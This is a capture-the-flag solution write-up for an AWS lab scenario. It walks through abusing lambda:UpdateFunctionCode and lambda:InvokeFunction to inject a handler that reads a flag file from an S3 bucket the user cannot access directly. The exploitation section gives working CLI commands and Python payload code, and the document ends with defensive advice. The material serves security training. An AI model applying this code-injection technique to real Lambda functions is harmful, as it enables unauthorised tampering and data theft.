# Solution: Lambda Code Update + Invocation to Bucket

This scenario demonstrates a privilege escalation path where an attacker with `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` can use an existing Lambda function as a proxy to read sensitive S3 data they have no direct access to. The vulnerability lies in granting code modification and execution permissions on a function whose execution role carries S3 read access — two permissions that each seem reasonable in isolation but combine into a full data access path.

The attack is immediate and repeatable. Because the attacker holds both update and invoke permissions, there is no waiting for an event trigger or external condition. They can push malicious code and call it on demand, using the Lambda execution role as a credential-borrowing mechanism. The function acts as a trusted intermediary: IAM evaluates permissions against the execution role at runtime, so any code running inside the function inherits those permissions regardless of what the invoking principal is allowed to do directly.

This pattern appears in real environments when developers or CI/CD pipelines are given Lambda code deployment rights as a convenience, without accounting for the fact that some of those functions run with roles that have broad data access. Treating `lambda:UpdateFunctionCode` as a low-risk "deployment permission" is the core mistake.

## The Challenge

You start with credentials for `pl-prod-lambda-004-to-bucket-starting-user` — an IAM user with Lambda permissions but no direct S3 access. There is a pre-existing Lambda function, `pl-prod-lambda-004-to-bucket-target-lambda`, whose execution role (`pl-prod-lambda-004-to-bucket-target-role`) has `s3:GetObject` and `s3:ListBucket` on the target bucket.

Your goal is to retrieve `flag.txt` from `pl-prod-lambda-004-to-bucket-{account_id}-{suffix}`. Direct S3 API calls from the starting user will be denied. The path runs through the Lambda function.

## Reconnaissance

Start by confirming your identity and establishing that direct S3 access is blocked:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-lambda-004-to-bucket-starting-user
```

Try listing the target bucket directly — this should fail:

```bash
aws s3 ls s3://pl-prod-lambda-004-to-bucket-{account_id}-{suffix}
# An error occurred (AccessDenied) ...
```

Now look at the Lambda function you can modify. The two most important fields in the response are the handler name and the execution role ARN:

```bash
aws lambda get-function --function-name pl-prod-lambda-004-to-bucket-target-lambda
```

Note the `Configuration.Handler` value — it will read `lambda_function.lambda_handler`. This tells you the entry file must be named `lambda_function.py` and the callable entry point must be `lambda_handler`. If either name is wrong the runtime won't find your payload and the invocation will silently return an error in the response body.

Also note `Configuration.Role` — it confirms the execution role is `pl-prod-lambda-004-to-bucket-target-role`, the role with S3 access to the target bucket.

## Exploitation

The strategy is to extend the existing function code rather than replace it outright. This is less disruptive to the environment (the original code continues to exist) and avoids breaking any dependencies already bundled in the deployment package.

First, download the current code using the presigned URL from `GetFunction`:

```bash
PRESIGNED_URL=$(aws lambda get-function \
  --function-name pl-prod-lambda-004-to-bucket-target-lambda \
  --query 'Code.Location' \
  --output text)

curl -s -o /tmp/original_function.zip "$PRESIGNED_URL"
mkdir -p /tmp/lambda_work
cd /tmp/lambda_work && unzip -o /tmp/original_function.zip && cd -
```

Now append a payload to `lambda_function.py`. The payload overrides the `lambda_handler` symbol so that when the function is invoked it reads `flag.txt` from the target bucket and returns the contents in the response body:

```bash
cat >> /tmp/lambda_work/lambda_function.py << 'EOF'

def _read_flag(bucket_name):
    import boto3
    s3 = boto3.client('s3')
    obj = s3.get_object(Bucket=bucket_name, Key='flag.txt')
    return obj['Body'].read().decode('utf-8')

_original_handler = lambda_handler

def lambda_handler(event, context):
    import boto3
    s3 = boto3.client('s3')
    buckets = s3.list_buckets()['Buckets']
    target = [b['Name'] for b in buckets if 'lambda-004-to-bucket' in b['Name']][0]
    flag = _read_flag(target)
    return {'statusCode': 200, 'body': flag}
EOF
```

Repackage the modified directory and push it to the function:

```bash
cd /tmp/lambda_work && zip -r /tmp/modified_function.zip . && cd -

aws lambda update-function-code \
  --function-name pl-prod-lambda-004-to-bucket-target-lambda \
  --zip-file fileb:///tmp/modified_function.zip
```

The response will include `"LastUpdateStatus": "Successful"` once Lambda has processed the new code. Give it a few seconds to finish, then invoke the function:

```bash
aws lambda invoke \
  --function-name pl-prod-lambda-004-to-bucket-target-lambda \
  --payload '{}' \
  /tmp/response.json

cat /tmp/response.json
```

The response body contains the flag value returned by `s3.get_object`. The Lambda runtime executed your code as `pl-prod-lambda-004-to-bucket-target-role`, and that role had the `s3:GetObject` permission needed to read the file.

## Verification

The invocation response body is the proof. If `cat /tmp/response.json` shows a JSON object with a `body` field containing the flag string, the attack worked. You can also confirm the execution role was used by checking who made the S3 API call in CloudTrail — the caller will be the Lambda execution role, not the starting user.

To extract just the flag value:

```bash
cat /tmp/response.json | python3 -c "import sys, json; r=json.load(sys.stdin); print(r.get('body', r))"
```

## Capture the Flag

For `to-bucket` scenarios the flag lives directly in the target S3 bucket as `flag.txt`. You already retrieved it via the Lambda invocation response in the previous step — the value printed by the command above is the flag.

If you want to confirm it matches what is stored in S3 (or retrieve it by a different means), you can also read it directly once you have access via the execution role session credentials. However, the cleanest path is the one you already took: the Lambda response body contains the exact bytes of `flag.txt` as read by the execution role.

The flag value is deployment-specific — its exact contents come from `flags.default.yaml` in the repo root (or a vendor override). The retrieval mechanism is the same across all `to-bucket` scenarios: inject code into a function whose role can read the bucket, invoke it, and parse the response.

```bash
# Alternatively, read directly from S3 if you have obtained the execution role credentials:
aws s3 cp s3://pl-prod-lambda-004-to-bucket-{account_id}-{suffix}/flag.txt -
```

## What Happened

You turned a Lambda function into a data exfiltration proxy. By combining `lambda:UpdateFunctionCode` (write access to the function's code) with `lambda:InvokeFunction` (the ability to trigger that code on demand), you borrowed the execution role's S3 permissions without ever holding them yourself. IAM evaluated the S3 API call against the execution role at runtime — your starting user credentials never touched S3 directly.

In real environments this risk surfaces wherever Lambda deployment permissions are handed out informally — a developer gets `lambda:UpdateFunctionCode` to push hotfixes, a data pipeline service account gets `lambda:InvokeFunction` to trigger ETL jobs, and nobody notices that both permissions together on a function with a broad execution role constitute a complete data access path. The fix is threefold: scope Lambda execution roles to the minimum permissions the function actually needs, restrict code update permissions to dedicated deployment identities enforced by CI/CD, and never grant both update and invoke to the same principal for functions with sensitive execution roles.
